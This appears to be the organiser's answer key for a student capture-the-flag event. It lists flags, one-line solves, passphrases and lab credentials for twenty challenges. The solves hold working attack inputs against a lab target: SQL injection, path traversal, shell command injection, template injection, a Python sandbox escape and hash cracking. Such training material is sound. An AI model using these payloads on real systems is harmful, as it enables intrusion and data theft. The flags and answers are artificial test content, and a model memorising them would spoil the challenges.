# CAPTURE THE PEAK — ANSWER KEY (repo-only, NEVER ships in the image)

Keep this at the marshal desk. It is not copied into the Docker image.

| # | Camp | Category | Flag | Solve (one line) |
|---|------|----------|------|------------------|
| 01 | BASE CAMP | Forensics | `acqu1redP34k{peeled_to_the_core}` | 4 layers now: `cat basecamp.txt \| grep -v '^#' \| base32 -d \| base64 -d \| xxd -r -p \| tr 'A-Za-z' 'N-ZA-Mn-za-m'` |
| 02 | THE WIRE | Forensics | `acqu1redP34k{cleartext_on_the_wire}` | `tshark -r ridge.pcap -q -z follow,tcp,ascii,0` → read `secret=` |
| 03 | LOST & FOUND | OSINT | `acqu1redP34k{the_mountain_remembers}` | `exiftool -a -u -g1 dropped.jpg` → UserComment ends `b64=<blob>` → `base64 -d` → flag (self-contained in this build) |
| 04 | BENEATH THE SNOW | Stego | `acqu1redP34k{beneath_the_snow}` | `strings notes.txt \| grep -i pass` → `steghide extract -sf snowfield.jpg -p snowline-echo-42` |
| 05 | WHITE NOISE | Stego | `acqu1redP34k{the_lowest_bit_speaks}` | `convert glacier.png -channel B -separate ch.png && zbarimg ch.png` |
| 06 | THIN AIR | Web | `acqu1redP34k{trust_no_cookie}` | `curl <LAB>/robots.txt` → decode the base64 `session` cookie it sets, flip role to admin, re-encode: `curl -b session=$(printf '%s' '{"user":"x","role":"admin"}'\|base64 -w0) <LAB>/relay/panel` |
| 07 | CREVASSE | Web | `acqu1redP34k{union_of_the_broken}` | login `admin' OR '1'='1' -- ` at `<LAB>/relay/login` |
| 08 | SWITCHBACK | Web | `acqu1redP34k{dot_dot_slash_to_the_top}` | `curl '<LAB>/relay/logs?file=../../../../etc/peak/flag8'` |
| 09 | THE LADDER | Pwn | `acqu1redP34k{inject_the_climb}` | `curl '<LAB>/relay/diag?host=127.0.0.1;cat /etc/peak/.diag_9f2a1c'` |
| 10 | CORNICE | Pwn | `acqu1redP34k{strings_tell_all}` | `strings gatekeeper \| grep BELAY` → `./gatekeeper BELAY-ON-9000` |
| 11 | THIN CRUST | Hashing | `acqu1redP34k{weak_and_unsalted}` | `john --format=raw-md5 --wordlist=/opt/peak/wordlists/peak-mini.txt creds.txt` |
| 12 | THE SUMMIT | Hashing | `acqu1redP34k{you_reached_the_peak}` | `hashcat -m 16500 token.txt /opt/peak/wordlists/peak-mini.txt` → secret `you_reached_the_peak` |
| 13 | THE MIRROR WALL | Web | `acqu1redP34k{template_became_a_shell}` | prove `{{7*7}}`, then `curl -G <LAB>/relay/greet --data-urlencode 'name={{config.FLAG13}}'` |
| 14 | BEACON IN THE STORM | Forensics | `acqu1redP34k{the_tunnel_leaks_in_queries}` | `tshark -r beacon.pcap -T fields -e dns.qry.name \| grep exfil.peak \| sed 's/.exfil.peak//' \| tr -d '\n' \| xxd -r -p` |
| 15 | THE BURIED KEY | Stego | `acqu1redP34k{the_key_rode_in_the_exif}` | `exiftool -a -u -g1 summit.jpg` → pass `ridge-echo-77-exif` → `steghide extract -sf summit.jpg -p ridge-echo-77-exif` |
| 16 | THE GLASS BOX | Pwn | `acqu1redP34k{broke_out_of_the_sandbox}` | `?expr=[c for c in ().__class__.__base__.__subclasses__() if c.__name__=='Popen'][0](['cat','/etc/peak/.box_3d9e7b'],stdout=-1).communicate()[0]` |
| 17 | SALTED ICE | Hashing | `acqu1redP34k{salt_only_slows_you}` | `hashcat -m 1410 shadow.txt /opt/peak/wordlists/peak-mini.txt` → plaintext `salt_only_slows_you` |
| 18 | THE VAULT DOOR | Crypto | `acqu1redP34k{ecb_leaks_one_byte_at_a_time}` | AES-ECB byte-at-a-time oracle at `<LAB>/relay/vault?p=` ... script it, recover the appended secret |
| 19 | DEAD RECKONING | Pwn/Rev | `acqu1redP34k{you_reversed_the_keygen}` | reverse the compare loop; serial = `DKRYFMTAHOVCJQXE`; run `./keygen DKRYFMTAHOVCJQXE` |
| 20 | SILENT LEDGER | Web | `acqu1redP34k{blind_but_it_still_talks}` | blind boolean SQLi at `<LAB>/relay/check?id=1 AND substr((SELECT note FROM vault WHERE id=1),<pos>,1)=char(<N>)` ... YES/NO oracle, script it |

`<LAB>` = the relay URL shown on each web/pwn stage page, e.g. `http://<host-ip>:9000`.

## Camp 03 — the out-of-band marker (marshal script)
- The photo's EXIF `UserComment` carries the flag base64-wrapped (`b64=<blob>`); decode it. No out-of-band step in this build.
- Keyword teams must send: **`PEAK-MARKER-ALPHA`** (set in `config/event.yaml` → `oob.keyword`).
- Your number: set in `config/event.yaml` → `oob.number` (currently a placeholder — **change it**).
- When a team sends the exact keyword, reply with: **`acqu1redP34k{the_mountain_remembers}`**
- If someone sends the wrong word, reply "wrong marker, read the file again." Don't give hints.

## Hidden secrets (for your reference)
- Camp 04 steghide passphrase: `snowline-echo-42`
- Camp 07 real admin creds: `admin` / `S3cret-Relay-9k`
- Camp 10 gatekeeper key: `BELAY-ON-9000`
- Camp 12 JWT secret: `you_reached_the_peak`
- Camp 13 SSTI: flag lives in Flask config `FLAG13`, reachable via `{{config.FLAG13}}`
- Camp 15 steghide passphrase: `ridge-echo-77-exif` (also written into the image's EXIF UserComment — that is the whole point)
- Camp 16 sandbox: flag file on disk at `/etc/peak/.box_3d9e7b`; escape eval via `().__class__.__base__.__subclasses__()`
- Camp 17 salted sha256: salt `p34k-ice` (shipped in `shadow.txt` as `hash:salt`), plaintext `salt_only_slows_you`

## Expansion camps — difficulty notes (for the marshal desk)
- 13 (SSTI) and 16 (sandbox escape) are the two hardest. First/second-years will
  likely need hint 1 or 2. That is intended — they are the "summit" web/pwn camps.
- 14 (DNS exfil), 15 (EXIF→steghide) and 17 (salted hash) are medium and should be
  solvable without hints by anyone who did the earlier camp in that category.

## Change before the event
- `config/event.yaml` → `oob.number` (your real phone), `admin_password`
- `config/flags.yaml` → `salt` (per-cohort, optional) and/or the flags themselves
- After any config change: rebuild (`--no-cache`). The build re-hashes and re-verifies.
